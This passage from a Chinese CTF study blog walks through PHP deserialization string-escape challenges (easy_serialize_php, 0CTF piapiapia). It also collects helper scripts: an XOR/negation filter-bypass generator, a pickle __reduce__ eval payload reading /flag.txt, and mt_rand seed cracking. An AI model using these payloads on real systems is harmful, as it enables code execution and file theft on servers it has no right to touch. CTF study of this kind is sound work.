<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>经过过滤后有两种情况，一种是增多，一种是减少</p>
<p>该题为减少，有两种解决方法，一种是值逃逸，另外一种是键逃逸</p>
<p><a href="https://blog.csdn.net/a3320315/article/details/104118688/">(47条消息) 安洵杯2019 easy_serialize_php (反序列化中的对象逃逸)_a3320315的博客-CSDN博客_easy_serialize_php</a></p>
<h1 id="0CTF-2016-piapiapia1"><a href="#0CTF-2016-piapiapia1" class="headerlink" title="[0CTF 2016]piapiapia1"></a>[0CTF 2016]piapiapia1</h1><p>扫描后得到<a href="http://www.php文件,下载之后得到一些文件,打开之后看到/">www.php文件，下载之后得到一些文件，打开之后看到</a></p>
<p><strong>config.php</strong>   <strong>显示配置信息</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个文件中包含flag，</p>
<p><strong>update.php</strong>     <strong>上传文件</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);<span class="comment">//限制包含11个数字</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);<span class="comment">//Email格式</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)<span class="comment">//要使逻辑为假，前面为真，因此后面也为真，采用数组的方法绕过长度限制</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));<span class="comment">//寻找update_profile，并且存在序列化</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>_POST[‘nickname’]) &gt; 10 绕过  nickname[]****=</strong></p>
<p><strong>class.php</strong> <strong>存在重要函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后寻找filter</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;<span class="comment">//进行了替换，想到字符串逃逸</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>profile.php****读取文件</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//可以读取文件，$profile[&#x27;photo&#x27;]这个参数是关键，这里可以想到用用这个变量来包含config.php文件，从而读取flag,利用字符串逃逸，是构造的部分被读取，后面传入的参数无效</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>[(49条消息) BUUCTF <a href="https://blog.csdn.net/weixin_44037296/article/details/112183323">0CTF 2016] piapiapia_Senimo-CSDN博客</a></p>
]]></content>
      <categories>
        <category>unserialize</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/01/16/%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>buuctf*</title>
    <url>/2022/01/24/upload/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/Z_Grant/article/details/100606382">(47条消息) 文件包含——原理及应用和防护（1）_Z_Grant的博客-CSDN博客_文件包含的作用</a></p>
<p><a href="https://blog.csdn.net/Z_Grant/article/details/100606382">https://blog.csdn.net/Z_Grant/article/details/100606382</a></p>
<p><a href="https://blog.csdn.net/aweiname2008/article/details/119522187">(47条消息) 从0到1 CTFer成功之路》任意文件读取漏洞—学习笔记_aweiname2008的博客-CSDN博客_任意文件读取漏洞</a></p>
<h1 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h1><p><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">(47条消息) Web安全-一句话木马_Tr0e-CSDN博客_一句话木马</a></p>
<p><a href="https://www.cnblogs.com/moon3/p/12688281.html">php一句话木马变形技巧 - moon3 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>buuctf*</category>
      </categories>
      <tags>
        <tag>buuctf*</tag>
      </tags>
  </entry>
  <entry>
    <title>upload</title>
    <url>/2022/02/14/ssi/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>脚本</title>
    <url>/2022/03/05/%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="正则匹配绕过字母，数字"><a href="#正则匹配绕过字母，数字" class="headerlink" title="正则匹配绕过字母，数字"></a>正则匹配绕过字母，数字</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#blacklist列表中的字符在生成的拼接字符串中不会被使用,除了部分是被过滤掉的字符，其余的如&#x27;,&quot;等字符考虑可能会导致闭合等问题暂列入</span></span><br><span class="line"><span class="comment">#如果有其他的要求可以对blacklist列表进行删改</span></span><br><span class="line">blacklist=[<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;\\&quot;</span><span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>,<span class="string">&quot;E&quot;</span>,<span class="string">&quot;F&quot;</span>,<span class="string">&quot;G&quot;</span>,<span class="string">&quot;H&quot;</span>,<span class="string">&quot;I&quot;</span>,<span class="string">&quot;J&quot;</span>,<span class="string">&quot;K&quot;</span>,<span class="string">&quot;L&quot;</span>,<span class="string">&quot;M&quot;</span>,<span class="string">&quot;N&quot;</span>,<span class="string">&quot;O&quot;</span>,<span class="string">&quot;P&quot;</span>,<span class="string">&quot;Q&quot;</span>,<span class="string">&quot;R&quot;</span>,<span class="string">&quot;S&quot;</span>,<span class="string">&quot;T&quot;</span>,<span class="string">&quot;U&quot;</span>,<span class="string">&quot;V&quot;</span>,<span class="string">&quot;W&quot;</span>,<span class="string">&quot;X&quot;</span>,<span class="string">&quot;Y&quot;</span>,<span class="string">&quot;Z&quot;</span>]</span><br><span class="line"><span class="comment">#不同于取反,一个目标字符串使用异或的方式可以获大量的可用拼接字符串,这里只取了1种组合的拼接字符串</span></span><br><span class="line"><span class="comment">#如果需要获得更多拼接字符串查看该函数中的result列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yiHuo</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">global</span> operationEffient</span><br><span class="line">    <span class="keyword">global</span> blacklist</span><br><span class="line">    operationEffient=<span class="literal">False</span></span><br><span class="line">    result=[]</span><br><span class="line">    finalstr=<span class="string">&#x27;&quot;&quot;^&quot;&quot;&#x27;</span></span><br><span class="line">    rawstr=string</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(rawstr)):</span><br><span class="line">        result.extend([[]])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(rawstr)):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">255</span>):</span><br><span class="line">           <span class="keyword">if</span>(<span class="built_in">chr</span>(i) <span class="keyword">not</span> <span class="keyword">in</span> blacklist):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">255</span>):</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">chr</span>(j) <span class="keyword">not</span> <span class="keyword">in</span> blacklist):</span><br><span class="line">                        <span class="keyword">if</span>(i^j==<span class="built_in">ord</span>(rawstr[k])):</span><br><span class="line">                            result[k].extend([[<span class="built_in">hex</span>(i).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&quot;%&quot;</span>),<span class="built_in">hex</span>(j).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&quot;%&quot;</span>)]])</span><br><span class="line">    <span class="comment">#在这里往下的函数部分,result列表均是可用的(已填充了获得的拼接字符串)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(result)):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(result[i])==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span>(<span class="string">&quot;该字符在现有黑名单下无法拼接出-&gt;%s&quot;</span>%(rawstr[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(rawstr)):</span><br><span class="line">        finalstr=finalstr[:finalstr.find(<span class="string">&quot;^&quot;</span>,<span class="number">0</span>)-<span class="number">1</span>]+result[i][<span class="number">0</span>][<span class="number">0</span>]+<span class="string">&#x27;&quot;&#x27;</span>+finalstr[finalstr.find(<span class="string">&quot;^&quot;</span>,<span class="number">0</span>):]</span><br><span class="line">        finalstr=finalstr[:finalstr.rfind(<span class="string">&quot;&#x27;&quot;</span>,<span class="number">0</span>)]+result[i][<span class="number">0</span>][<span class="number">1</span>]+finalstr[finalstr.rfind(<span class="string">&#x27;&quot;&#x27;</span>,<span class="number">0</span>):]</span><br><span class="line">    <span class="keyword">return</span>(finalstr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quFan</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">global</span> operationEffient</span><br><span class="line">    <span class="keyword">global</span> blacklist</span><br><span class="line">    operationEffient=<span class="literal">False</span></span><br><span class="line">    result=[]</span><br><span class="line">    finalstr=<span class="string">&#x27;~&quot;&quot;&#x27;</span></span><br><span class="line">    rawstr=string</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(rawstr)):</span><br><span class="line">        result.extend([[]])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(rawstr)):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">255</span>):</span><br><span class="line">           <span class="keyword">if</span>(<span class="built_in">chr</span>(i) <span class="keyword">not</span> <span class="keyword">in</span> blacklist <span class="keyword">and</span> <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">bin</span>(~i &amp; <span class="number">0xFF</span>)[<span class="number">2</span>:],<span class="number">2</span>))==rawstr[k]):</span><br><span class="line">               result[k].extend([<span class="built_in">hex</span>(i).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&quot;%&quot;</span>)])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(result)):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(result[i])==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span>(<span class="string">&quot;该字符在现有黑名单下无法拼接出-&gt;%s&quot;</span>%(rawstr[i]))</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(rawstr)):</span><br><span class="line">        finalstr=finalstr[:finalstr.rfind(<span class="string">&#x27;&quot;&#x27;</span>,<span class="number">0</span>)]+result[i][<span class="number">0</span>]+finalstr[finalstr.rfind(<span class="string">&#x27;&quot;&#x27;</span>,<span class="number">0</span>):]</span><br><span class="line">    <span class="keyword">return</span>(finalstr)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    operationEffient=<span class="literal">True</span></span><br><span class="line">    target=<span class="built_in">input</span>(<span class="string">&quot;请输入待转换字符\n&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span>(operationEffient):</span><br><span class="line">        operation=<span class="built_in">input</span>(<span class="string">&quot;请选择操作\n1-&gt;使用异或拼接\n2-&gt;使用取反获得\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(operation==<span class="string">&quot;1&quot;</span>):</span><br><span class="line">            result=yiHuo(target)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span>(operation==<span class="string">&quot;2&quot;</span>):</span><br><span class="line">            result=quFan(target)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;选择的操作无效&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h1 id="查找页面中的某一东西"><a href="#查找页面中的某一东西" class="headerlink" title="查找页面中的某一东西"></a>查找页面中的某一东西</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://05f8a587-94e7-4143-9b45-985808ed7b8a.node4.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">	r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="built_in">print</span> (i)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="python魔术方法"><a href="#python魔术方法" class="headerlink" title="python魔术方法"></a>python魔术方法</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment">#python2运行</span></span><br></pre></td></tr></table></figure>

<p>），然后得到完整的随机数。</p>
<h1 id="将已知的部分伪随机数转化为php-mt-seed工具可以看懂的数据"><a href="#将已知的部分伪随机数转化为php-mt-seed工具可以看懂的数据" class="headerlink" title="将已知的部分伪随机数转化为php_mt_seed工具可以看懂的数据"></a>将已知的部分伪随机数转化为php_mt_seed工具可以看懂的数据</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 =<span class="string">&#x27;Hg11vtADEm&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="由已知种子生成伪随机数"><a href="#由已知种子生成伪随机数" class="headerlink" title="由已知种子生成伪随机数"></a>由已知种子生成伪随机数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">348806110</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

